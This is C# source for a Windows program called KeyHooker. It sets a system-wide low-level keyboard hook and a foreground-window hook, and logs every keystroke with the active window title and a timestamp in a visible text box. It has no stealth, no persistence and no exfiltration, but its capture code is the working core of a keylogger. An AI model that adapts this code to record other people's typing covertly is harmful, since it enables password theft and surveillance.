using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Text;
using System.Diagnostics;
using System.ComponentModel;

namespace KeyHooker
{
    static class Program
    {
        class HookerForm : Form
        {
            private ActiveWindow ActiveWindow;

            private KeyHooker KeyHooker;

            public HookerForm()
            {
                TextBox text = new TextBox
                {
                    Dock = DockStyle.Fill,
                    Multiline = true,
                    ReadOnly = true,
                    ScrollBars = ScrollBars.Vertical
                };

                this.Text = "KeyHooker";
                this.Size = new System.Drawing.Size(320, 240);
                this.Controls.Add(text);

                ActiveWindow = new ActiveWindow();
                ActiveWindow.ActiveWindowChanged += (sender, title, hwnd) =>
                {
                    text.AppendText(String.Format("\r\n{0}\r\n>>{1:HH:mm:ss}: {2}\r\n",
                       new String('-', 90), DateTime.Now, title));
                };

                KeyHooker = new KeyHooker();
                KeyHooker.KeyPress += (sender, key) =>
                {
                    text.AppendText(key);
                };
            }
        }

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new HookerForm());
        }
    }



    public delegate void KeyPressHandler(object sender, string key);
    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    class KeyHooker
    {

        private IntPtr hook = IntPtr.Zero;
        private LowLevelKeyboardProc keyboardProc;

        public event KeyPressHandler KeyPress;
        public KeyHooker()
        {
            keyboardProc = HookCallback;
            hook = SetHook(keyboardProc);
        }
        ~KeyHooker()
        {
            NativeMethods.UnhookWindowsHookEx(hook);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process process = Process.GetCurrentProcess())
            {
                using (ProcessModule module = process.MainModule)
                {
                    return NativeMethods.SetWindowsHookEx(NativeMethods.WH_KEYBOARD_LL, proc,
                        NativeMethods.GetModuleHandle(module.ModuleName), 0);
                }
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)NativeMethods.WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);

                if (KeyPress != null)
                    KeyPress(this, GetCharsFromKeys((uint)vkCode));
            }
            return NativeMethods.CallNextHookEx(hook, nCode, wParam, lParam);
        }


        private string GetCharsFromKeys(uint vKey)
        {
            if (vKey == 8) { return "[BS]"; }
            if (vKey == 9) { return "[TAB]"; }
            if (vKey == 13) { return Environment.NewLine /*+"[CR]"*/; }
            if (vKey == 27) { return "[ESC]"; }

            uint sKey = 0;
            StringBuilder buffer = new StringBuilder(256);
            byte[] keyboardState = new byte[256];

            bool keyStateShift = ((NativeMethods.GetKeyState(NativeMethods.VK_SHIFT) & 0x80) == 0x80 ? true : false);
            bool keyStateCapslock = (NativeMethods.GetKeyState(NativeMethods.VK_CAPITAL) != 0 ? true : false);

            NativeMethods.GetKeyboardState(keyboardState);

            NativeMethods.ToUnicodeEx(vKey, sKey, keyboardState, buffer, 256, 0, GetKeyboardLayoutId());

            char key = buffer[0];
            if ((keyStateCapslock ^ keyStateShift) && Char.IsLetter(key)) key = Char.ToUpper(key);

            return key.ToString();
        }

        private int GetKeyboardLayoutId()
        {
            int processId;
            int keyboardLayoutId = 0;
            InputLanguageCollection inputLanguageCollection = InputLanguage.InstalledInputLanguages;

            IntPtr handle = NativeMethods.GetForegroundWindow();

            int winThreadProcId = NativeMethods.GetWindowThreadProcessId(handle, out processId);

            IntPtr KeybLayout = NativeMethods.GetKeyboardLayout(winThreadProcId);
            foreach (InputLanguage language in inputLanguageCollection)
            {
                if (KeybLayout == language.Handle)
                {
                    keyboardLayoutId = language.Culture.KeyboardLayoutId;
                    break;
                }
            }

            return keyboardLayoutId;
        }
    }



    public delegate void ActiveWindowChangedHandler(object sender, String windowHeader, IntPtr hwnd);
    public delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

    class ActiveWindow
    {
        public event ActiveWindowChangedHandler ActiveWindowChanged;

        IntPtr m_hhook;

        WinEventDelegate _winEventProc;

        public ActiveWindow()
        {
            _winEventProc = new WinEventDelegate(WinEventProc);
            m_hhook = NativeMethods.SetWinEventHook(NativeMethods.EVENT_SYSTEM_FOREGROUND,
                NativeMethods.EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, _winEventProc,
                0, 0, NativeMethods.WINEVENT_OUTOFCONTEXT);
        }

        void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd,
            int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            if (eventType == NativeMethods.EVENT_SYSTEM_FOREGROUND)
            {
                if (ActiveWindowChanged != null)
                    ActiveWindowChanged(this, GetActiveWindowTitle(hwnd), hwnd);
            }
        }

        private string GetActiveWindowTitle(IntPtr hwnd)
        {
            StringBuilder Buff = new StringBuilder(500);
            NativeMethods.GetWindowText(hwnd, Buff, Buff.Capacity);
            return Buff.ToString();
        }

        ~ActiveWindow()
        {
            NativeMethods.UnhookWinEvent(m_hhook);
        }
    }



    public static class NativeMethods
    {
        public const uint WINEVENT_OUTOFCONTEXT = 0;
        public const uint EVENT_SYSTEM_FOREGROUND = 3;

        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;

        public const byte VK_SHIFT = 0x10;
        public const byte VK_CAPITAL = 0x14;
        public const byte VK_NUMLOCK = 0x90;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        public static extern int ToUnicode(uint virtualKeyCode, uint scanCode,
            byte[] keyboardState,
            [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)]
            StringBuilder receivingBuffer,
            int bufferSize, uint flags);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetKeyboardLayout(int WindowsThreadProcessID);

        [DllImport("user32")]
        public static extern int GetKeyboardState(byte[] pbKeyState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern short GetKeyState(int vKey);

        [DllImport("user32.dll")]
        public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState,
            [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
           int cchBuff, uint wFlags, int dwhkl);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int GetWindowThreadProcessId(IntPtr handleWindow, out int lpdwProcessID);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        public static extern bool UnhookWinEvent(IntPtr hWinEventHook);

        [DllImport("user32.dll")]
        public static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax,
            IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc,
            uint idProcess, uint idThread, uint dwFlags);
    }

}

